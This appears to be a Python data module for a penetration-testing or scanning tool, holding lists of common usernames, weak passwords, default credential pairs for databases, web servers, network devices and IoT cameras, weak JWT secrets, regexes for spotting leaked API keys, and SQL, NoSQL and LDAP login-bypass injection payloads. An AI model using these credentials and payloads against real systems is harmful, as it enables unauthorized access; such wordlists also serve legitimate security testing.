"""认证绕过和弱口令库 - 200+ 条目"""

# 常见用户名
USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest",
    "demo", "manager", "operator", "superuser", "sysadmin",
    "webmaster", "master", "sa", "dba", "backup", "oracle",
    "mysql", "postgres", "tomcat", "jenkins", "git", "svn",
    "ftp", "www", "web", "app", "api", "dev", "prod", "stage",
    "admin1", "admin123", "test1", "test123", "user1", "user123",
    "support", "service", "info", "mail", "contact", "sales",
    "marketing", "hr", "finance", "it", "security", "network",
]

# 弱密码
WEAK_PASSWORDS = [
    "", "admin", "password", "123456", "12345678", "123456789",
    "1234567890", "qwerty", "abc123", "111111", "123123",
    "admin123", "root", "toor", "pass", "test", "guest",
    "master", "login", "welcome", "password1", "password123",
    "P@ssw0rd", "P@ssword", "p@ssword", "passw0rd", "Pa$$w0rd",
    "admin@123", "Admin123", "Admin@123", "root123", "Root123",
    "letmein", "monkey", "dragon", "baseball", "shadow",
    "superman", "michael", "football", "batman", "trustno1",
    "000000", "121212", "654321", "666666", "888888", "987654321",
    "qwerty123", "qwertyuiop", "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
    "abcd1234", "asdf1234", "1234qwer", "4321rewq", "qazwsx",
    "changeme", "default", "secret", "server", "computer",
    "internet", "database", "system", "access", "temp", "temptemp",
]

# 默认凭据 (用户名, 密码)
DEFAULT_CREDS = [
    # 通用
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", ""), ("admin", "1234"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "123456"), ("root", ""), ("root", "admin"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("test", "test"), ("test", "123456"), ("guest", "guest"),
    
    # 数据库
    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "123456"),
    ("mysql", "mysql"), ("mysql", ""), ("mysql", "root"),
    ("postgres", "postgres"), ("postgres", ""), ("postgres", "password"),
    ("oracle", "oracle"), ("oracle", "password"),
    ("mongo", "mongo"), ("mongodb", "mongodb"),
    
    # Web服务
    ("tomcat", "tomcat"), ("tomcat", "s3cret"), ("tomcat", "admin"),
    ("manager", "manager"), ("manager", "tomcat"),
    ("admin", "tomcat"), ("both", "tomcat"),
    ("role1", "role1"), ("role", "changethis"),
    
    # 网络设备
    ("cisco", "cisco"), ("cisco", ""), ("cisco", "password"),
    ("admin", "cisco"), ("admin", "admin123"),
    ("ubnt", "ubnt"), ("admin", "ubnt"),
    
    # 应用
    ("jenkins", "jenkins"), ("hudson", "hudson"),
    ("nagios", "nagios"), ("nagiosadmin", "nagios"),
    ("zabbix", "zabbix"), ("Admin", "zabbix"),
    ("grafana", "grafana"), ("admin", "grafana"),
    
    # 物联网/摄像头
    ("admin", "admin1234"), ("admin", "12345"), ("admin", "54321"),
    ("root", "vizxv"), ("root", "xc3511"), ("root", "dreambox"),
    ("admin", "1111"), ("admin", "7ujMko0admin"),
    ("888888", "888888"), ("666666", "666666"),
    
    # 云服务
    ("admin", "changeme"), ("admin", "default"),
]

# JWT 弱密钥
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "key", "private",
    "jwt_secret", "jwt-secret", "jwtsecret", "auth_secret",
    "token_secret", "api_secret", "app_secret",
    "your-256-bit-secret", "your-secret-key",
    "changeme", "changeit", "default",
]

# API密钥格式正则
API_KEY_PATTERNS = {
    "AWS_ACCESS_KEY": r"AKIA[0-9A-Z]{16}",
    "AWS_SECRET_KEY": r"[0-9a-zA-Z/+]{40}",
    "GITHUB_TOKEN": r"ghp_[0-9a-zA-Z]{36}",
    "GITHUB_OAUTH": r"gho_[0-9a-zA-Z]{36}",
    "GITLAB_TOKEN": r"glpat-[0-9a-zA-Z\-]{20}",
    "SLACK_TOKEN": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
    "SLACK_WEBHOOK": r"https://hooks\.slack\.com/services/T[0-9A-Z]{8}/B[0-9A-Z]{8}/[a-zA-Z0-9]{24}",
    "STRIPE_KEY": r"sk_live_[0-9a-zA-Z]{24}",
    "STRIPE_RESTRICTED": r"rk_live_[0-9a-zA-Z]{24}",
    "GOOGLE_API": r"AIza[0-9A-Za-z\-_]{35}",
    "GOOGLE_OAUTH": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
    "FIREBASE": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
    "TWILIO_SID": r"AC[0-9a-fA-F]{32}",
    "TWILIO_TOKEN": r"SK[0-9a-fA-F]{32}",
    "SENDGRID": r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",
    "MAILGUN": r"key-[0-9a-zA-Z]{32}",
    "MAILCHIMP": r"[0-9a-f]{32}-us[0-9]{1,2}",
    "SQUARE_OAUTH": r"sq0csp-[0-9A-Za-z\-_]{43}",
    "SQUARE_ACCESS": r"sq0atp-[0-9A-Za-z\-_]{22}",
    "PAYPAL": r"access_token\$production\$[0-9a-z]{13}\$[0-9a-f]{32}",
    "HEROKU": r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",
    "JWT": r"eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*",
    "PRIVATE_KEY": r"-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----",
}

# 认证绕过 Payload
AUTH_BYPASS = [
    # SQL注入绕过
    "admin'--",
    "admin'/*",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "1' OR '1'='1",
    
    # NoSQL注入绕过
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$regex":".*"}',
    "admin'||'1'=='1",
    
    # LDAP注入绕过
    "*",
    "*)(&",
    "*))%00",
    "admin)(&)",
    "admin)(|(password=*))",
]
